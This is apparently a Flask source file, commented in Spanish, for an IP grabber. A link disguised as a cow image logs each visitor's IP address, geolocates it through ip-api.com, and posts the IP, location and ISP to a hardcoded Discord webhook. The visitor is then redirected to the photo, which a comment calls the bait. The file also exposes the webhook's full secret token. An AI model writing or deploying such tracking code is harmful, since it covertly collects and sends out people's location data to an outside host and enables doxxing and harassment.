from flask import Flask, request, redirect
from datetime import datetime
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1563012196504436879/wU6hemm8vVllEETqQDCLJ5NbpYTtQvA96E-KM9QCM-uEMBd9a6ARcOEzIHmVrc89b5Ti"

COW_IMAGE = "https://upload.wikimedia.org/wikipedia/commons/0/0c/Cow_female_black_white.jpg"


def send_ip(ip, date):
    # Geo opcional: si falla, igual manda la IP
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    except Exception:
        geo = {}

    ubicacion = ", ".join(filter(None, [
        geo.get("country"), geo.get("regionName"), geo.get("city")
    ])) or "N/D"
    isp = geo.get("isp", "N/D")

    data = {
        "embeds": [{
            "title": f"IP: {ip}",
            "description": (
                f"**Fecha:** {date}\n"
                f"**Ubicacion:** {ubicacion}\n"
                f"**ISP:** {isp}"
            ),
            "color": 5763719
        }]
    }
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except Exception:
        pass


@app.route("/")
def index():
    # Toma solo la primera IP real (evita cadenas tipo "ip1, ip2" por proxy)
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr) or ""
    ip = ip.split(",")[0].strip()
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    # El bait: lo manda a la foto de la vaca
    return redirect(COW_IMAGE)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
